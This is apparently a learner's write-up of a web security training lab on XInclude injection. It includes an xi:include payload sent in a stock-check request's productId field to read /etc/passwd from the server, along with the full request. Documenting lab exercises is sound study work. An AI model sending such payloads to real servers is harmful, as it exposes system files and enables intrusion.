Exploiting XInclude to Retrieve Files

**Category**: XXE  
**Difficulty**: Practitioner  

---

## Overview / What I Learned

- This lab demonstrates how to exploit XML parsers that support **XInclude**, even when full XXE with DTD injection is not possible.
- I learned how XInclude allows file retrieval via an `<xi:include>` tag embedded within user-supplied input.
- This technique is useful when the attacker can inject partial XML but not define an external DTD.

---

## Exploit Steps / Attack Methodology

### 1. Initial Recon
- Visited a product page, clicked **"Check stock"**, and intercepted the resulting `POST /product/stock` request.
- Observed that the parameter `productId` was likely inserted directly into an XML document server-side.

### 2. Test for XInclude Support
- Replaced the `productId` value with an XInclude payload designed to read `/etc/passwd`:
  ---xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
3. Full Payload Sent
POST /product/stock HTTP/1.1
Host: <your-lab-id>.web-security-academy.net
...

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
4. Result
The response included the contents of /etc/passwd, confirming the XInclude injection succeeded.
Lab marked as solved.

Key Takeaways
XInclude can be used as an alternative to classic XXE when DTD injection is restricted.

<xi:include> requires the proper namespace and a well-formed XML structure around the injected content.

Useful when you suspect the input is placed directly in XML and traditional XXE doesn't work.
